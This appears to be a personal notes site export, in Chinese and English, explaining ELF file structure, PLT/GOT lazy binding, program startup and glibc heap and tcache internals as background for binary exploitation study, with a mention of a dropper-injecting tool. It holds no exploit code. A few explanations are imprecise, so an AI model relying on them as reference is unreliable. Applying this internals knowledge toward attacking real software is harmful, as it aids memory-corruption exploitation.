(bytes into file) Start of section headers: 6216 (bytes into file) Flags: 0x0 Size of this header: 52 (bytes) Size of program headers: 32 (bytes) Number of program headers: 9 Size of section headers: 40 (bytes) Number of section headers: 29 Section header string table index: 28 下面依次解释上面从 readelf 中读取出来的信息：\nMagic #  As can be seen in this screenshot, the ELF header starts with some magic.\nThis ELF header magic provides information about the file. The first 4 hexadecimal parts define that this is an ELF file (45=E, 4c=L, 46=F), prefixed with the 7f value.\nThis ELF header is mandatory. It ensures that data is correctly interpreted during linking or execution. To better understand the inner working of an ELF file, it is useful to know this header information is used.\nClass #  After the ELF type declaration, there is a Class field defined. This value determines the architecture for the file. It can a 32-bit (=01) or 64-bit (=02) architecture.\nThe magic shows a 01, which is translated by the readelf command as an ELF32 file. In other words, an ELF file using the 32-bit architecture. Not surprising, as this particular machine contains a modern CPU.\nData #  Next part is the data field. It knows two options: 01 for LSB (Least Significant Bit), also known as little-endian. Then there is the value 02, for MSB (Most Significant Bit, big-endian).\nThis particular value helps to interpret the remaining objects correctly within the file. This is important, as different types of processors deal differently with the incoming instructions and data structures. In this case, LSB is used, which is common for AMD64 type processors.\nVersion #  Currently, there is only 1 version type: currently, which is the value “01”. So nothing interesting to remember.\nOS/ABI #  Each operating system has a big overlap in common functions. In addition, each of them has specific ones, or at least minor differences between them. The definition of the right set is done with an Application Binary Interface (ABI). This way the operating system and applications both know what to expect and functions are correctly forwarded. These two fields describe what ABI is used and the related version.\nIn this case, the value is 00, which means no specific extension is used.\nABI version #  When needed, a version for the ABI can be specified.\nMachine #  We can also find the expected machine type (AMD64) in the header.\nType #  The type field tells us what the purpose of the file is. There are a few common file types.\n CORE (value 4) DYN (Shared object file), for libraries (value 3) EXEC (Executable file), for binaries (value 2) REL (Relocatable file), before linked into an executable file (value 1)  File Data #  Before we dive into these headers, it is good to know that ELF has two complementary “views”:\n  One is to be used for the linker to allow execution (segments).\n  The other one for categorizing instructions and data (sections).\n  So depending on the goal, the related header types are used. Let’s start with program headers, which we find on ELF binaries.\nSegments (Program Headers) #  An ELF file consists of zero or more segments, and describe how to create a process/memory image for runtime execution.\nWhen the kernel sees these segments, it uses them to map them into virtual address space, using the mmap(2) system call. In other words, it converts predefined instructions into a memory image. If your ELF file is a normal binary, it requires these program headers. Otherwise, it simply won’t run. It uses these headers, with the underlying data structure, to form a process. This process is similar for shared libraries.\n可以用 readelf 命令 --segments 参数或者 --program-headers 参数查看程序头信息：\n$ readelf --segments ./ret2dlresolve Elf file type is DYN (Shared object file) Entry point 0x4b0 There are 9 program headers, starting at offset 52 Program Headers: Type Offset VirtAddr PhysAddr FileSiz MemSiz Flg Align PHDR 0x000034 0x00000034 0x00000034 0x00120 0x00120 R 0x4 INTERP 0x000154 0x00000154 0x00000154 0x00013 0x00013 R 0x1 [Requesting program interpreter: /lib/ld-linux.so.2] LOAD 0x000000 0x00000000 0x00000000 0x008b0 0x008b0 R E 0x1000 LOAD 0x000ec4 0x00001ec4 0x00001ec4 0x00144 0x00148 RW 0x1000 DYNAMIC 0x000ecc 0x00001ecc 0x00001ecc 0x000f8 0x000f8 RW 0x4 NOTE 0x000168 0x00000168 0x00000168 0x00044 0x00044 R 0x4 GNU_EH_FRAME 0x000760 0x00000760 0x00000760 0x0003c 0x0003c R 0x4 GNU_STACK 0x000000 0x00000000 0x00000000 0x00000 0x00000 RW 0x10 GNU_RELRO 0x000ec4 0x00001ec4 0x00001ec4 0x0013c 0x0013c R 0x1 Section to Segment mapping: Segment Sections... 00 01 .interp 02 .interp .note.ABI-tag .note.gnu.build-id .gnu.hash .dynsym .dynstr .gnu.version .gnu.version_r .rel.dyn .rel.plt .init .plt .plt.got .text .fini .rodata .eh_frame_hdr .eh_frame 03 .init_array .fini_array .dynamic .got .data .bss 04 .dynamic 05 .note.ABI-tag .note.gnu.build-id 06 .eh_frame_hdr 07 08 .init_array .fini_array .dynamic .got 我们看到上面一共有九个程序头，我们只看其中的两个比较重要的信息：\n GNU_EH_FRAME：这里存储着 gcc 的一个队列，它里面存储的是处理程序异常的句柄。程序异常时，这个区域会正确处理这些异常； GNU_STACK：这里时程序的栈区信息。可以看到栈区时只是可读可写的。  Sections (Sections Headers) #  Sections can be found in an ELF binary after the GNU C compiler transformed C code into assembly, followed by the GNU assembler, which creates objects of it.\n同样的我们也可以用 readelf 命令的 --sections 参数或 --sections-headers 参数查看程序的节头信息：\n$ readelf --sections ./ret2dlresolve There are 29 section headers, starting at offset 0x1848: Section Headers: [Nr] Name Type Addr Off Size ES Flg Lk Inf Al [ 0] NULL 00000000 000000 000000 00 0 0 0 [ 1] .interp PROGBITS 00000154 000154 000013 00 A 0 0 1 [ 2] .note.ABI-tag NOTE 00000168 000168 000020 00 A 0 0 4 [ 3] .note.gnu.build-i NOTE 00000188 000188 000024 00 A 0 0 4 [ 4] .gnu.hash GNU_HASH 000001ac 0001ac 000020 04 A 5 0 4 [ 5] .dynsym DYNSYM 000001cc 0001cc 0000d0 10 A 6 1 4 [ 6] .dynstr STRTAB 0000029c 00029c 0000bc 00 A 0 0 1 [ 7] .gnu.version VERSYM 00000358 000358 00001a 02 A 5 0 2 [ 8] .gnu.version_r VERNEED 00000374 000374 000030 00 A 6 1 4 [ 9] .rel.dyn REL 000003a4 0003a4 000050 08 A 5 0 4 [10] .rel.plt REL 000003f4 0003f4 000028 08 AI 5 22 4 [11] .init PROGBITS 0000041c 00041c 000023 00 AX 0 0 4 [12] .plt PROGBITS 00000440 000440 000060 04 AX 0 0 16 [13] .plt.got PROGBITS 000004a0 0004a0 000010 08 AX 0 0 8 [14] .text PROGBITS 000004b0 0004b0 000292 00 AX 0 0 16 [15] .fini PROGBITS 00000744 000744 000014 00 AX 0 0 4 [16] .rodata PROGBITS 00000758 000758 000008 00 A 0 0 4 [17] .eh_frame_hdr PROGBITS 00000760 000760 00003c 00 A 0 0 4 [18] .eh_frame PROGBITS 0000079c 00079c 000114 00 A 0 0 4 [19] .init_array INIT_ARRAY 00001ec4 000ec4 000004 04 WA 0 0 4 [20] .fini_array FINI_ARRAY 00001ec8 000ec8 000004 04 WA 0 0 4 [21] .dynamic DYNAMIC 00001ecc 000ecc 0000f8 08 WA 6 0 4 [22] .got PROGBITS 00001fc4 000fc4 00003c 04 WA 0 0 4 [23] .data PROGBITS 00002000 001000 000008 00 WA 0 0 4 [24] .bss NOBITS 00002008 001008 000004 00 WA 0 0 1 [25] .comment PROGBITS 00000000 001008 00002b 01 MS 0 0 1 [26] .symtab SYMTAB 00000000 001034 000480 10 27 43 4 [27] .strtab STRTAB 00000000 0014b4 000297 00 0 0 1 [28] .shstrtab STRTAB 00000000 00174b 0000fc 00 0 0 1 Key to Flags: W (write), A (alloc), X (execute), M (merge), S (strings), I (info), L (link order), O (extra OS processing required), G (group), T (TLS), C (compressed), x (unknown), o (OS specific), E (exclude), p (processor specific) 节的内容的程序的核心内容，我在另一个文件中整理了相关节的主要作用：ElfSections\nTools for binary analysis #  elfutils #   /usr/bin/eu-addr2line /usr/bin/eu-ar – alternative to ar, to create, manipulate archive files /usr/bin/eu-elfcmp /usr/bin/eu-elflint – compliance check against gABI and psABI specifications /usr/bin/eu-findtextrel – find text relocations /usr/bin/eu-ld – combining object and archive files /usr/bin/eu-make-debug-archive /usr/bin/eu-nm – display symbols from object/executable files /usr/bin/eu-objdump – show information of object files /usr/bin/eu-ranlib – create index for archives for performance /usr/bin/eu-readelf – human-readable display of ELF files /usr/bin/eu-size – display size of each section (text, data, bss, etc) /usr/bin/eu-stack – show the stack of a running process, or coredump /usr/bin/eu-strings – display textual strings (similar to strings utility) /usr/bin/eu-strip – strip ELF file from symbol tables /usr/bin/eu-unstrip – add symbols and debug information to stripped binary  Notes: the elfutils package is a great start, as it contains most utilities to perform analysis.\nelfkickers #   /usr/bin/ebfc – compiler for Brainfuck programming language /usr/bin/elfls – shows program headers and section headers with flags /usr/bin/elftoc – converts a binary into a C program /usr/bin/infect – tool to inject a dropper, which creates setuid file in /tmp /usr/bin/objres – creates an object from ordinary or binary data /usr/bin/rebind – changes bindings/visibility of symbols in ELF file /usr/bin/sstrip – strips unneeded components from ELF file  Notes: the author of the ELFKickers package focuses on manipulation of ELF files, which might be great to learn more when you find malformed ELF binaries.\npax-utils #   /usr/bin/dumpelf – dump internal ELF structure /usr/bin/lddtree – like ldd, with levels to show dependencies /usr/bin/pspax – list ELF/PaX information about running processes /usr/bin/scanelf – wide range of information, including PaX details /usr/bin/scanmacho – shows details for Mach-O binaries (Mac OS X) /usr/bin/symtree – displays a leveled output for symbols  我习惯用的 #  # 查看文件头 $ readelf --file-header \u0026lt;program\u0026gt; # 查看程序头 $ readelf --program-headers \u0026lt;program\u0026gt; # 查看节头 $ readelf --section-headers \u0026lt;program\u0026gt; # 查看动态链接的依赖 $ lddtree \u0026lt;program\u0026gt; "},{"id":28,"href":"/docs/%E5%AE%89%E5%85%A8%E6%8A%80%E6%9C%AF/linux%E6%BA%90%E7%A0%81%E9%98%85%E8%AF%BB/elfsections/","title":"Elf Sections","section":"LinuxAudit","content":" 参考：\n  https://linux-audit.com/elf-binaries-on-linux-understanding-and-analysis/\n  https://lief.quarkslab.com/doc/stable/tutorials/05_elf_infect_plt_got.html\n  http://blog.k3170makan.com/2018/10/introduction-to-elf-format-part-v.html\n  http://dbp-consulting.com/tutorials/debugging/linuxProgramStartup.html\n  https://stackoverflow.com/questions/34966097/what-functions-does-gcc-add-to-the-linux-elf\n   Elf Sections #  常见节 #  我们分析以下几个比较重要的节头：\n .text：该段包含的是可执行代码，该段中的数据只可读不可写，该段中的数据只加载一次。 .data：已被初始化的数据，可读可写。 .rodata：已被初始化的数据，只可读不可写。 .bss：未初始化数据，可读可写。  链接相关 #  动态链接过程 #  此处详解以下动态链接过程中最重要的部分，libc 函数的链接过程。libc 中的函数，若使用动态链接，则关键的两个表项时 .got 表与 .plt 表，这种绑定方式又称为延迟绑定。\n比如我们在某一个函数中进行了 puts 系统调用，在调用之前表结构大致如下：\n .text sections .plt table .got table +--------------+ +---------------+ +------------------+ | [my_func] | | [puts@plt] | | [puts@got] | | | | | | | | jmp 0x400480 ----\u0026gt;| jmp 0x601028 ---\u0026gt;| 0x601028:0x400486--+ | | | | | | | | ... | +-\u0026gt;| push 0x2 | | ... | | +--------------+ | | | +------------------+ | | | jmp 0x400450 --+ | | | | | | | | ... | | | | +---------------+ | | +--------------------|----------------------+ +----------------------+ | +------------------+ +--\u0026gt;|[_dl_resolve@plt] | +------------------+ 可见：\n .text 段中任何对 libc 函数得调用，编译是只会将程序执行权交给 .plt 表； .plt 表实际上是一段代码，.got 表实际上只是地址到地址的映射； 一个函数对应的 .plt 表代码由三行组成：  .plt 表的第一行指向 .got 表对应的位置； 如果函数第一次调用，.got 默认会指向 .plt 表的第二行； .plt 表的第二三行调用 _dl_runtime_resolve 函数，将实际的地址导入 .got 表中    也就是说，调用了之后，这三段结构会变成下面的结构：\n .text sections .plt table .got table +--------------+ +---------------+ +--------------+ | [my_func] | | [puts@plt] | | [puts@got] | | | | | | | | jmp 0x400480 ---\u0026gt;| jmp 0x601028 ---\u0026gt;| 0x601028:puts-----\u0026gt;puts | | | | | | | ... | | push 0x2 | | ... | +--------------+ | | +--------------+ | jmp 0x400450 --+ | | | | ... | | +---------------+ | | +----------------------v | +------------------+ ---\u0026gt;|[_dl_resolve@plt] | +------------------+ 动态链接节 #  在使用 readelf 命令查看一个程序的节列表时，类型为 REL 的节区包含重定位表项：\n  .got 节保存全局变量偏移表，.got.plt 节保存全局函数偏移表；.plt 节是过程链接表。过程链接表把位置独立的函数调用重定向到绝对位置。\n  .rel.dyn 节是用于变量重定位，.rel.plt 节是用于函数重定位。\n可以使用 readelf 命令的 --relocs 参数查看这两个节区的内容：\n$ readelf -r ./ret2dlresolve 重定位节 \u0026#39;.rel.dyn\u0026#39; at offset 0x3a4 contains 10 entries: 偏移量 信息 类型 符号值 符号名称 00001ec4 00000008 R_386_RELATIVE 00001ec8 00000008 R_386_RELATIVE 00001ff8 00000008 R_386_RELATIVE 00002004 00000008 R_386_RELATIVE 00001fe4 00000306 R_386_GLOB_DAT 00000000 _ITM_deregisterTMClone 00001fe8 00000406 R_386_GLOB_DAT 00000000 __cxa_finalize@GLIBC_2.1.3 00001fec 00000506 R_386_GLOB_DAT 00000000 __gmon_start__ 00001ff0 00000906 R_386_GLOB_DAT 00000000 stdin@GLIBC_2.0 00001ff4 00000a06 R_386_GLOB_DAT 00000000 stdout@GLIBC_2.0 00001ffc 00000b06 R_386_GLOB_DAT 00000000 _ITM_registerTMCloneTa 重定位节 \u0026#39;.rel.plt\u0026#39; at offset 0x3f4 contains 5 entries: 偏移量 信息 类型 符号值 符号名称 00001fd0 00000107 R_386_JUMP_SLOT 00000000 setbuf@GLIBC_2.0 00001fd4 00000207 R_386_JUMP_SLOT 00000000 read@GLIBC_2.0 00001fd8 00000607 R_386_JUMP_SLOT 00000000 strlen@GLIBC_2.0 00001fdc 00000707 R_386_JUMP_SLOT 00000000 __libc_start_main@GLIBC_2.0 00001fe0 00000807 R_386_JUMP_SLOT 00000000 write@GLIBC_2.0   .dynsym 节包含了动态链接符号表。可以用 readelf 命令的 --symbols 参数查看：\n$ readelf --symbols ./ret2dlresolve Symbol table \u0026#39;.dynsym\u0026#39; contains 13 entries: Num: Value Size Type Bind Vis Ndx Name 0: 00000000 0 NOTYPE LOCAL DEFAULT UND 1: 00000000 0 FUNC GLOBAL DEFAULT UND setbuf@GLIBC_2.0 (2) 2: 00000000 0 FUNC GLOBAL DEFAULT UND read@GLIBC_2.0 (2) 3: 00000000 0 NOTYPE WEAK DEFAULT UND _ITM_deregisterTMCloneTab 4: 00000000 0 FUNC WEAK DEFAULT UND __cxa_finalize@GLIBC_2.1.3 (3) 5: 00000000 0 NOTYPE WEAK DEFAULT UND __gmon_start__ 6: 00000000 0 FUNC GLOBAL DEFAULT UND strlen@GLIBC_2.0 (2) 7: 00000000 0 FUNC GLOBAL DEFAULT UND __libc_start_main@GLIBC_2.0 (2) 8: 00000000 0 FUNC GLOBAL DEFAULT UND write@GLIBC_2.0 (2) 9: 00000000 0 OBJECT GLOBAL DEFAULT UND stdin@GLIBC_2.0 (2) 10: 00000000 0 OBJECT GLOBAL DEFAULT UND stdout@GLIBC_2.0 (2) 11: 00000000 0 NOTYPE WEAK DEFAULT UND _ITM_registerTMCloneTable 12: 0000075c 4 OBJECT GLOBAL DEFAULT 16 _IO_stdin_used ....   .dynstr 节包含了动态链接的字符串。这个节以 \\x00 作为开始和结尾，中间每个字符串也以 \\x00 间隔。\n  _start 相关 #  __libc_start_main 函数流程 #  在介绍这一节之前可以需要先了解以下 Linux 程序是如何启动一个程序的。以下是 loader 的调用图：\n下面我们依次介绍以下整个程序运行的流程：\n  在 _start 函数之前，Linux 进行了 execuve() 系统调用，在栈上布置好了 argc、argv 与 envp 参数，并且设置好了 stdin、stdout、stderr。\n  在 _start 函数中，传入数个参数执行了 __libc_start_main，这个函数的原型如下：\nint __libc_start_main( int (*main) (int, char * *, char * *), int argc, char * * ubp_av, void (*init) (void), void (*fini) (void), void (*rtld_fini) (void), void (* stack_end)); 这些参数的含义分别是：\n main：程序的主进程，它的返回值最终会传递给 exit 函数，之后退出进程； arcg、ubp_av：main 函数传入的两个参数 argc 与 argv； init：__libc_csu_init 的地址，在 main 函数之前调用，程序的构造函数； fini：__libc_csu_fini 的地址，程序的析构函数；通过 __cxat_exit 函数注册； rtld_fini：动态链接段的析构函数；通过 __cxat_exit 函数注册； stack_end：栈的尾指针；    然后程序在程序中按照上图的次序依次调用各个函数（这里先不细说了，详见 LinuxProgramStart）。\n  __libc_start_main 节作用 #  那么这个过程中主要创建了哪些个节呢？\n 主要有三个：preinit_array、init_array 与 fini_array。 这三个节的本质都是一个函数指针的数组。它们存储的函数，会在程序运行的特定时刻，被执行。  下面分别介绍这三个节：\n .preinit_array：其中的函数，会在程序的构造函数（一般指 __libc_csu_init）执行之前，被调用； .init_array：其中的函数，会在程序构造函数执行之后，main 函数执行之前被执行。这个数组有一个默认就存在的函数 frame_dummy，它用于保护栈的运行与安全。 .fini_array：其中的函数，会在 main 函数执行之后被执行。glibc 中定义了一个函数 __do_global_dtors_aux 会在这个节未被定义时被默认执行，详见 Stack Overflow。  当然，程序员在写 c 程序时可以自己向数组中添加元素：\nvoid init(int argc, char **argv, char **envp) { printf(\u0026#34;%s\\n\u0026#34;, __FUNCTION__); } __attribute__((section(\u0026#34;.init_array\u0026#34;))) typeof(init) *__init = init; "},{"id":29,"href":"/docs/%E5%AE%89%E5%85%A8%E6%8A%80%E6%9C%AF/linux%E6%BA%90%E7%A0%81%E9%98%85%E8%AF%BB/glibcheap/","title":"Glibc Heap","section":"LinuxAudit","content":" 参考：长亭科技堆的概念\n 堆基础 #  堆的一些特点：\n 堆是可以根据运行时的需要进行动态分配和释放的内存，大小可变； 堆的实现重点关注内存块的组织和管理方式（尤其时空闲的内存块）：  如何提高分配和释放的时间效率； 如何降低碎片化，提高空间利用率；    常见堆的实现：\n dlmalloc：通用分配器； ptmalloc2：glibc 函数，基于 dlmalloc，支持多线程； jemalloc：FreeBSD、FireFox、Android；内存占用更高，但是在多核多线程下的表现也最为优异。 tcmalloc：Google Chrome、Golang；针对多核情况有所优化，性能有所提高，但是内存占用稍高，大内存分配容易出现 CPU 飙升。 libumem：Solaris； Windows 10：segment heap。   相关资料：\n https://www.cyningsun.com/07-07-2018/memory-allocator-contrasts.html#%E7%B3%BB%E7%BB%9F%E5%90%91%E7%9C%8Bptmalloc%E5%86%85%E5%AD%98%E7%AE%A1%E7%90%86   glibc heap #  相关结构 #  下面介绍管理 glic 堆的各种数据结构：\narena #  arena 指的是内存区域本身，并非一个结构：\n 主线程的堆由 sbrk 创建，称为 main arena； 其他线程的堆由 mmap 创建，称为 per thread arena；  arena 的数量受 CPU 核数的限制：\n 对于 32 位系统：数量上限 = 2 * 核数 对于 64 位系统：数量上限 = 8 * 核数  malloc_state #  它是管理 arena 的核心结构，其定义在 glibc 源码的 /malloc/malloc.c 这个文件中：\nstruct malloc_state { /* Serialize access. */ __libc_lock_define (, mutex); /* Flags (formerly in max_fast). */ int flags; /* Set if the fastbin chunks contain recently inserted free blocks. */ /* Note this is a bool but not all targets support atomics on booleans. */ int have_fastchunks; /* Fastbins */ mfastbinptr fastbinsY[NFASTBINS]; /* Base of the topmost chunk -- not otherwise kept in a bin */ mchunkptr top; /* The remainder from the most recent split of a small request */ mchunkptr last_remainder; /* Normal bins packed as described above */ mchunkptr bins[NBINS * 2 - 2]; /* Bitmap of bins */ unsigned int binmap[BINMAPSIZE]; /* Linked list */ struct malloc_state *next; /* Linked list for free arenas. Access to this field is serialized by free_list_lock in arena.c. */ struct malloc_state *next_free; /* Number of threads attached to this arena. 0 if the arena is on the free list. Access to this field is serialized by free_list_lock in arena.c. */ INTERNAL_SIZE_T attached_threads; /* Memory allocated from the system in this arena. */ INTERNAL_SIZE_T system_mem; INTERNAL_SIZE_T max_system_mem; }; 同样在文件 /malloc/malloc.c 中，定义了全局变量 main_arena 管理主线程的 malloc_state：\nstatic struct malloc_state main_arena = { .mutex = _LIBC_LOCK_INITIALIZER, .next = \u0026amp;main_arena, .attached_threads = 1 }; malloc_chunks #  内存块的结构，glibc 源码的 ./malloc/malloc.c 这个文件中定义：\nstruct malloc_chunk { INTERNAL_SIZE_T mchunk_prev_size; /* Size of previous chunk (if free). */ INTERNAL_SIZE_T mchunk_size; /* Size in bytes, including overhead. */ struct malloc_chunk* fd; /* double links -- used only if free. */ struct malloc_chunk* bk; /* Only used for large blocks: pointer to next larger size. */ struct malloc_chunk* fd_nextsize; /* double links -- used only if free. */ struct malloc_chunk* bk_nextsize; }; 空闲内存块的结构大致如下（字段右侧为32 位平台下的比特位长）：\n 第一个字段 prev_size 存储了，物理地址上的前一个 chunk 的大小。 第二个字段 size 记录了当前 chunk 的大小。最后三个比特位被用作其他含义：  P 代表 PREV_INUSE，指明前一个 chunk 是否被使用； M 代表 IS_MAPPED，代表当前的 chunk 是否通过 mmap 方式创建出来的； N 代表 NON_MAIN_ARENA，代表当前 chunk 是否属于其他线程堆（主线程值为 0）；   第三四个字段为前向指针与后向指针，这两个字段用于 bin 链表中。  已分配内存块的结构大致如下：\n  前两个字段与空闲的内存块大致相同；\n  用户可用的数据是第三个字段开始一直到下一个 chunk 的第一个字段。这是因为：\n prev_size 只有当前一个字段是空闲的时候才有意义，如果前一个字段已经分配，堆管理器不关心；  这也就是说，在 32 位程序中，如果用户申请了 16 个字节的空间，其对应的 chunk 数据结构的 data 段只会有 12 个字节，用户加上下一个 chunk 的 prev_size 空间，一共可以使用 16 个字节。\n但是 size 记录的是 prev_size 起始到下一个 prev_size 起始之间的大小。\n  在 32 位平台下，chunk 的大小一定是 8 字节的整数倍（所以 size 的最低三个比特位是无用的）。malloc 返回地址指针为 data 的起始位置。\n  fastbins #  bins 是根据 chunk 的大小和状态，用来管理和组织空闲块的，链表的数组结构。\nfastbins 用于管理最小的 chunk。他存储在了 malloc_state 中的数组变量 fastbinsY 中。它同样定义在 /malloc/malloc.c 这个文件中：\n/* Fastbins An array of lists holding recently freed small chunks. Fastbins are not doubly linked. It is faster to single-link them, and since chunks are never removed from the middles of these lists, double linking is not necessary. Also, unlike regular bins, they are not even processed in FIFO order (they use faster LIFO) since ordering doesn\u0026#39;t much matter in the transient contexts in which fastbins are normally used. Chunks in fastbins keep their inuse bit set, so they cannot be consolidated with other free chunks. malloc_consolidate releases all chunks in fastbins and consolidates them with other free chunks. */ typedef struct malloc_chunk *mfastbinptr; #define fastbin(ar_ptr, idx) ((ar_ptr)-\u0026gt;fastbinsY[idx]) 可以得出它有以下这些特点：\n 它是一个单向链表（因为从来不会需要从中间移除元素的操作，不需要双向链表）； 后进先出（其他的垃圾回收结构是先进先出）； chunk 被清理时，PREV_INUSE 标志位不会被清零； 32 位系统中，fastbin 中默认支持最大的 chunk 的数据空间大小为 64 字节。但是 glibc 可以支持的 chunk 的数据空间最大为 80 字节。 一共有十个 fastbins； 相邻的空闲的 fastbin chunk 不会被合并。  下面是一个 32 位程序在运行时的 fastbins 示例图：\nbins (small \u0026amp; large \u0026amp; unsorted) #  源码中有一段注释解释这些 bins：\n/* Bins An array of bin headers for free chunks. Each bin is doubly linked. The bins are approximately proportionally (log) spaced. There are a lot of these bins (128). This may look excessive, but works very well in practice. Most bins hold sizes that are unusual as malloc request sizes, but are more usual for fragments and consolidated sets of chunks, which is what these bins hold, so they can be found quickly. All procedures maintain the invariant that no consolidated chunk physically borders another one, so each chunk in a list is known to be preceeded and followed by either inuse chunks or the ends of memory. Chunks in bins are kept in size order, with ties going to the approximately least recently used chunk. Ordering isn\u0026#39;t needed for the small bins, which all contain the same-sized chunks, but facilitates best-fit allocation for larger chunks. These lists are just sequential. Keeping them in order almost never requires enough traversal to warrant using fancier ordered data structures. Chunks of the same size are linked with the most recently freed at the front, and allocations are taken from the back. This results in LRU (FIFO) allocation order, which tends to give each chunk an equal opportunity to be consolidated with adjacent freed chunks, resulting in larger free chunks and less fragmentation. To simplify use in double-linked lists, each bin header acts as a malloc_chunk. This avoids special-casing for headers. But to conserve space and improve locality, we allocate only the fd/bk pointers of bins, and then use repositioning tricks to treat these as the fields of a malloc_chunk*. */ 其中 small bins 有以下的特点：\n chunk 的大小小于 512 字节； 共有 62 个双向循环链表，每个链表中存储着相同大小的 chunk； 先进先出； 当有相邻的空闲内存块时，chunk 会被合并成一个更大的 chunk。  large bins 有以下的特点：\n chunk 的大小大于 512 字节； 共有 63 个双向循环链表，大小相近的 chunk 放在同一个 bin 中； chunk 按照大小从大到小排序； 先进先出； 当有相邻的空闲内存块时，chunk 会被合并成一个更大的 chunk。  unsorted bins 有以下的特点：\n chunk 的大小大于 64 个字节； 只有唯一一个双向循环链表； 当一个非 fastbin 的 chunk 被释放之后，它首先被放入 unsorted bin 等后续整理时，才会放入对应的 small bin/fast bin。  这三个 bins 共享一个 malloc_state 中的变量：\n/* Normal bins packed as described above */ mchunkptr bins[NBINS * 2 - 2]; 其中三种 bins 的排列大致如下图所示：\n相关函数 #  malloc() #  工作流程：\n 在 fast bins 中寻找 fast chunk，如果找到则结束； 在 small bins 中寻找 small chunk，如果找到则结束； 循环：  检查 unsorted bin 中的 last_remainder。如果它足够大大则分配这个 chunk，并将剩余的 chunk 标记为新的 last_remainer； 在 unsorted bin 中搜索，同时进行整理。如果遇到精确大小则返回，否则将 chunk 整理到它对应大小的 small/large bins 中去； 在 small bin 和 large bin 中搜索最合适的 chunk（不一定精确）；   使用 top chunk。  free() #  工作流程：\n 如果是 fast chunk，则放入 fast bin； 如果前一个 chunk 是空闲的：  unlink 前面的 chunk； 合并两个 chunk，并且放入 unsorted bin；   如果后一个 chunk 是 top chunk，则将当前 chunk 并入 top chunk； 如果后一个 chunk 是空闲的：  unlink 后面的 chunk； 合并两个 chunk，并且放入 unsorted bin；   前后两个 chunk 都不是空闲的，直接放入 unsorted bin；  unlink() #  unlink 函数用来将双向链表中的一个元素取出来，它源码如下：\n/* Take a chunk off a bin list */ // unlink p #define unlink(AV, P, BK, FD) { \\ // 由于 P 已经在双向链表中，所以有两个地方记录其大小，所以检查一下其大小是否一致。  if (__builtin_expect (chunksize(P) != prev_size (next_chunk(P)), 0)) \\ malloc_printerr (\u0026#34;corrupted size vs. prev_size\u0026#34;); \\ FD = P-\u0026gt;fd; \\ BK = P-\u0026gt;bk; \\ // 防止攻击者简单篡改空闲的 chunk 的 fd 与 bk 来实现任意写的效果。  if (__builtin_expect (FD-\u0026gt;bk != P || BK-\u0026gt;fd != P, 0)) \\ malloc_printerr (check_action, \u0026#34;corrupted double-linked list\u0026#34;, P, AV); \\ else { \\ FD-\u0026gt;bk = BK; \\ BK-\u0026gt;fd = FD; \\ // 下面主要考虑 P 对应的 nextsize 双向链表的修改  if (!in_smallbin_range (chunksize_nomask (P)) \\ // 如果P-\u0026gt;fd_nextsize为 NULL，表明 P 未插入到 nextsize 链表中。  // 那么其实也就没有必要对 nextsize 字段进行修改了。  // 这里没有去判断 bk_nextsize 字段，可能会出问题。  \u0026amp;\u0026amp; __builtin_expect (P-\u0026gt;fd_nextsize != NULL, 0)) { \\ // 类似于小的 chunk 的检查思路  if (__builtin_expect (P-\u0026gt;fd_nextsize-\u0026gt;bk_nextsize != P, 0) \\ || __builtin_expect (P-\u0026gt;bk_nextsize-\u0026gt;fd_nextsize != P, 0)) \\ malloc_printerr (check_action, \\ \u0026#34;corrupted double-linked list (not small)\u0026#34;, \\ P, AV); \\ // 这里说明 P 已经在 nextsize 链表中了。  // 如果 FD 没有在 nextsize 链表中  if (FD-\u0026gt;fd_nextsize == NULL) { \\ // 如果 nextsize 串起来的双链表只有 P 本身，那就直接拿走 P  // 令 FD 为 nextsize 串起来的  if (P-\u0026gt;fd_nextsize == P) \\ FD-\u0026gt;fd_nextsize = FD-\u0026gt;bk_nextsize = FD; \\ else { \\ // 否则我们需要将 FD 插入到 nextsize 形成的双链表中  FD-\u0026gt;fd_nextsize = P-\u0026gt;fd_nextsize; \\ FD-\u0026gt;bk_nextsize = P-\u0026gt;bk_nextsize; \\ P-\u0026gt;fd_nextsize-\u0026gt;bk_nextsize = FD; \\ P-\u0026gt;bk_nextsize-\u0026gt;fd_nextsize = FD; \\ } \\ } else { \\ // 如果在的话，直接拿走即可  P-\u0026gt;fd_nextsize-\u0026gt;bk_nextsize = P-\u0026gt;bk_nextsize; \\ P-\u0026gt;bk_nextsize-\u0026gt;fd_nextsize = P-\u0026gt;fd_nextsize; \\ } \\ } \\ } \\ } 它可能在以下函数中被调用：\n  malloc：\n  从恰好大小合适的 large bin 中获取 chunk。\n  这里需要注意的是 fastbin 与 small bin 就没有使用 unlink\n  依次遍历处理 unsorted bin 时也没有使用 unlink 的。\n    从比请求的 chunk 所在的 bin 大的 bin 中取 chunk。\n    free：\n 后向合并，合并物理相邻低地址空闲 chunk。 前向合并，合并物理相邻高地址空闲 chunk（除了 top chunk）。    malloc_consolidate：\n 后向合并，合并物理相邻低地址空闲 chunk。 前向合并，合并物理相邻高地址空闲 chunk（除了 top chunk）。    realloc：\n 前向扩展，合并物理相邻高地址空闲 chunk（除了 top chunk）。    "},{"id":30,"href":"/docs/%E5%AE%89%E5%85%A8%E6%8A%80%E6%9C%AF/linux%E6%BA%90%E7%A0%81%E9%98%85%E8%AF%BB/glibctcache/","title":"Glibc Tcache","section":"LinuxAudit","content":" 参考资料：\n http://p4nda.top/2018/03/20/tcache/ https://ctf-wiki.github.io/ctf-wiki/pwn/linux/glibc-heap/tcache_attack-zh/   Tcache #  介绍 #  tcache，全称是 thread local caching，是 libc 2.26 版本中新增加的内存管理机制，属于一种用于加速 malloc 分配的缓存机制。\n它由 64 个链表组成，处理逻辑位于 malloc 函数和 free 函数中，优先级较高，会先于全部的 bin 来处理，当缓存链表装满时，分配方式就与之前版本的 malloc 相同。\n源码分析 #  tcache_entry \u0026amp;\u0026amp; tcache_perthread_struct #  在 tcache 中新增了两个数据结构，它们的定义源码如下：\n/* We overlay this structure on the user-data portion of a chunk when the chunk is stored in the per-thread cache. */ typedef struct tcache_entry { struct tcache_entry *next; /* This field exists to detect double frees. */ struct tcache_perthread_struct *key; } tcache_entry; /* There is one of these for each thread, which contains the per-thread cache (hence \u0026#34;tcache_perthread_struct\u0026#34;). Keeping overall size low is mildly important. Note that COUNTS and ENTRIES are redundant (we could have just counted the linked list each time), this is for performance reasons. */ typedef struct tcache_perthread_struct { uint16_t counts[TCACHE_MAX_BINS]; tcache_entry *entries[TCACHE_MAX_BINS]; } tcache_perthread_struct; static __thread bool tcache_shutting_down = false; static __thread tcache_perthread_struct *tcache = NULL; 